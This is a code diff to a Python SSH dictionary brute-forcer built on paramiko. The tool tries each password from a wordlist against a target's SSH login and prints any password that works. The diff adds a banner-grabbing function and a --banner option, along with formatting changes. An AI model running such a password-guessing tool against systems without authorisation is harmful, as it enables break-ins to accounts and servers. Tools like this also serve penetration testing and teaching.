@@ -1,4 +1,4 @@
-import paramiko, sys, os, socket
+import paramiko, sys, os, socket, string
 import argparse
 from enum import Enum
 
@@ -9,11 +9,13 @@ class Code(Enum):
 	SSH_EXCEPTION = 2
 	SOCKET_ERROR = 3
 
-line = "\n------------------------------------------------------\n"
+line = "------------------------------------------------------\n"
 g_host = g_user_name = ""		# SSH connection details
+client_ssh = ""					# Instance of SSHClient
 g_word_list = ""				# path to the wordlist file
 SSH_PORT = 22					# default SSH port
 args = ""						# arguments passed in by user
+
 
 """
 	get the details of the SSH server from the user
@@ -34,24 +36,24 @@ def get_target_details():
 		print("\n [*] Program has been interrupted at your request")
 		sys.exit(2)
 
+
 """
 	show the entered target details
 """
 def show_target_details():
 	global g_host, g_user_name, g_word_list
 
-	print(line)
-	print("Target IP Address:", g_host)
+	#print(line)
+	print(line + "Target IP Address:", g_host)
 	print("Username:         ", g_user_name)
-	print("Wordlist Path:    ", os.path.abspath(g_word_list))
-	print(line)
+	print("Wordlist Path:    ", os.path.abspath(g_word_list) + "\n" + line)
 
 
 """
 	connect to the SSH server with the password passed as arg
 """
 def connect_ssh(password):
-	global g_host, g_user_name, g_word_list, args
+	global g_host, g_user_name, g_word_list, client_ssh, args
 
 	# create a new SSH client
 	client_ssh = paramiko.SSHClient()
@@ -78,6 +80,7 @@ def connect_ssh(password):
 
 	return code
 
+
 """
 	tries out all the passwords in a file
 """
@@ -85,11 +88,14 @@ def ssh_brute_forcer_dictionary():
 	global g_host, g_user_name, g_word_list
 
 
-	print(line + "[*] Running Dictionary Attack" + line)
-
-
 	# open the file containing the passwords to try
 	file_words = open(g_word_list)
+
+	# grab the banner if requested by the user
+	if (args.banner or args.verbose):
+		grab_banner()
+
+	print(line + "[*] Running Dictionary Attack\n" + line)
 
 	# read each password from the file_words
 	for password in file_words.readlines():
@@ -100,7 +106,7 @@ def ssh_brute_forcer_dictionary():
 
 			# we were able to connect successfuly to the target
 			if (response == Code.AUTHENTICATION_SUCCESSFUL):
-				print("{0}[*] Password found\n[*] Password: {1} {0}".format(line, password))
+				print("\n{0}[*] Password found\n[*] Password: {1}\n{0}".format(line, password))
 				sys.exit(0)
 
 			# authentication failed
@@ -127,10 +133,36 @@ def ssh_brute_forcer_dictionary():
 	print("No passwords matched")
 
 
+"""
+	gets the SSH Server details of the target
+"""
+def grab_banner():
+	"""
+	global client_ssh
+	client_ssh.load_system_host_keys()
+	try:
+		client_ssh.connect(g_host, SSH_PORT, g_user_name, password='bad-password-on-purpose')
+	except:
+		print(client_ssh._transport.get_banner())
+	"""
+
+	s = socket.socket()
+	s.connect((g_host, SSH_PORT))
+	banner = str(s.recv(1024))
+
+	print(line + "SSH Server Banner\n" + line)
+	print(banner + "\n" + line)
+
+	s.close()
+
+
 def main():
 	global args
 	parser = argparse.ArgumentParser()
+
 	parser.add_argument("-v", "--verbose", help="increase output verbosity", action="store_true")
+	parser.add_argument("--banner", help="get target's SSH server details", )
+
 	args = parser.parse_args()
 
 	get_target_details()
